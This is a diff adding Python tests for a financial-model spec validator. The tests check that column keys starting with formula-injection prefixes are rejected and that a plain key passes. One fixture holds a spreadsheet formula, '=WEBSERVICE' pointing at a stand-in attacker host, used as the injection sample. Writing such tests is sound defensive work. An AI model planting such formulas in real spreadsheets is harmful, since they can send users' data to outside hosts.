@@ -517,3 +517,82 @@ class TestSpecValidationTextFields:
         )
         errors = validate_spec(spec)
         assert any("section" in e and "formula injection" in e.lower() for e in errors)
+
+    def test_rejects_dangerous_value_cols_key(self) -> None:
+        spec = ModelSpec(
+            model_type="p_and_l",
+            title="Test",
+            currency="CHF",
+            granularity="annual",
+            start_period="2025",
+            n_periods=3,
+            n_history_periods=0,
+            assumptions=(),
+            drivers=(),
+            line_items=(),
+            metadata=MetadataDef(preparer="", date="", version="1.0"),
+            scenarios=(),
+            column_groups=(),
+            inputs=InputsDef(
+                source="",
+                period_col="period",
+                sheet="",
+                value_cols={'=WEBSERVICE("http://evil.com")': "revenue"},
+            ),
+            entities=(),
+        )
+        errors = validate_spec(spec)
+        assert any("inputs.value_cols" in e and "formula injection" in e.lower() for e in errors)
+
+    @pytest.mark.parametrize("prefix", ["=", "+", "-", "@"])
+    def test_rejects_all_dangerous_prefixes_in_value_cols_key(self, prefix: str) -> None:
+        spec = ModelSpec(
+            model_type="p_and_l",
+            title="Test",
+            currency="CHF",
+            granularity="annual",
+            start_period="2025",
+            n_periods=3,
+            n_history_periods=0,
+            assumptions=(),
+            drivers=(),
+            line_items=(),
+            metadata=MetadataDef(preparer="", date="", version="1.0"),
+            scenarios=(),
+            column_groups=(),
+            inputs=InputsDef(
+                source="",
+                period_col="period",
+                sheet="",
+                value_cols={f"{prefix}payload": "col"},
+            ),
+            entities=(),
+        )
+        errors = validate_spec(spec)
+        assert any("formula injection" in e.lower() for e in errors)
+
+    def test_accepts_safe_value_cols_key(self) -> None:
+        spec = ModelSpec(
+            model_type="p_and_l",
+            title="Test",
+            currency="CHF",
+            granularity="annual",
+            start_period="2025",
+            n_periods=3,
+            n_history_periods=0,
+            assumptions=(),
+            drivers=(),
+            line_items=(),
+            metadata=MetadataDef(preparer="", date="", version="1.0"),
+            scenarios=(),
+            column_groups=(),
+            inputs=InputsDef(
+                source="",
+                period_col="period",
+                sheet="",
+                value_cols={"revenue": "revenue_col"},
+            ),
+            entities=(),
+        )
+        errors = validate_spec(spec)
+        assert not any("inputs.value_cols" in e for e in errors)
